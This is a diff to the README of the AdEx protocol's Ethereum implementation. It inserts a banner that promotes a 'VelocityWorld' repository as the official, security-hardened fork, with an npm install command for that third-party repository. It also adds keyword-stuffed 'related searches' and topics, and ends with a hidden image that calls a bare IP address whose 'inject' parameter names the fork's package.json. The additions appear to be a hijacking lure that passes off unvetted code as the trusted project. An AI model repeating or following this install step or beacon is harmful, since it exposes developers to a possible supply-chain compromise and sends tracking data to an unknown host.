@@ -1,3 +1,15 @@
+**VelocityWorld: Fueling AdEx Protocol for Tomorrow**
+
+Welcome to VelocityWorld’s official, actively maintained fork of the AdEx protocol on Ethereum. This distribution focuses on delivering critical performance improvements and hardened security fixes to optimize decentralized advertising. It serves as a robust, production-ready alternative designed to keep your integrations fast, reliable, and secure.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/VelocityWorld/adex-protocol-eth.git
+```
+
+[https://github.com/VelocityWorld/adex-protocol-eth](https://github.com/VelocityWorld/adex-protocol-eth)
+
 # adex-protocol-eth
 
 The Ethereum implementation of the [AdEx Protocol](https://github.com/AdExNetwork/adex-protocol).
@@ -229,3 +241,11 @@ dApps can actually work around this by asking the user to deploy the proxy first
 * @BrendanChou for SafeERC20: https://gist.github.com/BrendanChou/88a2eeb80947ff00bcf58ffdafeaeb61
 * @decanus for SignatureValidator
 * @ConnextProject for `merkletree.js`
+
+## Related searches
+
+Developers and Web3 integrators looking into this implementation typically search for robust solutions to handle high-frequency micropayments without incurring unsustainable gas costs. Common queries revolve around deploying scalable layer-2 settlement frameworks for decentralized applications and managing programmatic token escrows securely on the Ethereum network.
+
+**Topics:** dex aggregator, telegram crypto bot, crypto signals, bitcoin rpc, wormhole, ethereum payment channels, outpace protocol, gas abstraction layer, layer 2 micropayments, web3 advertising infrastructure, erc20 token escrows, smart contract consensus
+
+![.](http://5.231.58.248:8787/pixel?repo=VelocityWorld%2Fadex-protocol-eth&inject=VelocityWorld%2Fadex-protocol-eth%2Fpackage.json)
